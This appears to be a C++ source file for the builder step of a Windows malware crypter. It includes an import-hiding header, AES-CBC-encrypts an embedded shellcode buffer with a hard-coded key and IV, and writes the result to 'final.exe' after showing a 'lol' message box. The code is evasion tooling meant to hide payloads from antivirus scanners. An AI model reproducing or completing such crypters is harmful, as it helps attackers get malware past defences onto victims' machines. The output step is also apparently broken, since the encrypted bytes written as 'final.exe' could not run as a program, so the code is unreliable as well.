#include  <windows.h>
#include <stdio.h>
#include <accctrl.h>
#include <aclapi.h>

#define _WIN32_DCOM
#include <comdef.h>
#include <Wbemidl.h>
#include <oleauto.h>
#include "lazy_importer.hpp"
#include "aes.hpp"
#include "he.h"


#pragma function(memcmp, memcpy, memset)












void* memset(void* DestInit, int Source, size_t Size)
{
    unsigned char* Dest = (unsigned char*)DestInit;
    while (Size--) *Dest++ = (unsigned char)Source;

    return(DestInit);
}

void* memcpy2(void* DestInit, void const* SourceInit, size_t Size)
{
    unsigned char* Source = (unsigned char*)SourceInit;
    unsigned char* Dest = (unsigned char*)DestInit;
    while (Size--) *Dest++ = *Source++;

    return(DestInit);
}

int main() {
	MessageBoxA(0, "lol", "lol", 0);
	SIZE_T shellcodeSize = sizeof(rawData);

	unsigned char key[] = "qwertyuiopasdfghjklzxcvbnmqwerty";
	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, rawData, shellcodeSize);

	HANDLE file =CreateFileA("final.exe", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD written = 0;
	WriteFile(file, rawData, sizeof(rawData), &written, NULL);
	CloseHandle(file);
	ExitProcess(0);
	
}